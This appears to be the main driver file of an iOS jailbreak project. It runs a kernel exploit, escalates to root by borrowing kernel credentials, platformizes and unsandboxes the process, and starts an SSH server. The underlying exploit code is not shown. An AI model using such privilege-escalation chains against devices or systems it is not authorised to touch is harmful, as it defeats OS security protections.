//
//  jailbreak.m
//  kfund
//
//  Created by Seo Hyun-gyu on 1/2/24.
//

#import "jailbreak.h"
#import "../ViewController.h"
#import "krw.h"
#import "kcall.h"
#import "offsets.h"
#import "escalate.h"
#import "utils.h"

#import "./test/dropbear.h"
#import "./test/handoffKRW.h"

void printlog_kfd_info(void) {
    print_log("current_proc = 0x%llx", get_selfproc());
    print_log("current_task = 0x%llx", get_selftask());
    print_log("current_pmap = 0x%llx", get_selfpmap());
    print_log("kernel_proc = 0x%llx", get_kernproc());
    print_log("kernel_task = 0x%llx", get_kerntask());
    print_log("kernel_pmap = 0x%llx", get_kernpmap());
    print_log("kernel_base = 0x%llx", get_kernbase());
    print_log("kernel_slide = 0x%llx", get_kslide());
    print_log("gPhysBase = 0x%llx", get_gphysbase());
    print_log("gPhysSize = 0x%llx", get_gphysize());
}

int start_jailbreak(void) {
    _offsets_init();
    
    print_log("running smith kexploit...");
    do_kopen(0x800, 1, 2, 2);
    printlog_kfd_info();
    prepare_kcall();
    
    //Stage 1. Grab kernel privileges
    uint64_t ucreds = borrow_ucreds(getpid(), 0);
    print_log("borrowed kernel ucreds: 0x%llx", ucreds);
    print_log("uid: %d, gid: %d", getuid(), getgid());
    
    //Stage 2. Platformize
    platformize(getpid());
    
    //Stage 3. Run dropbear (for testing inject trustcache)
    runSSH();
    
    //Stage 4. Test handoff Kernel r/w
    unborrow_ucreds(getpid(), ucreds);
    uint64_t sb = unsandbox(getpid());
    save_kslide();
    sandbox(getpid(), sb);
    ucreds = borrow_ucreds(getpid(), 0);
    test_handoffKRW();
    
    
    //Clean-up
    unborrow_ucreds(getpid(), ucreds);
    term_kcall();
    do_kclose();
    
    return 0;
}
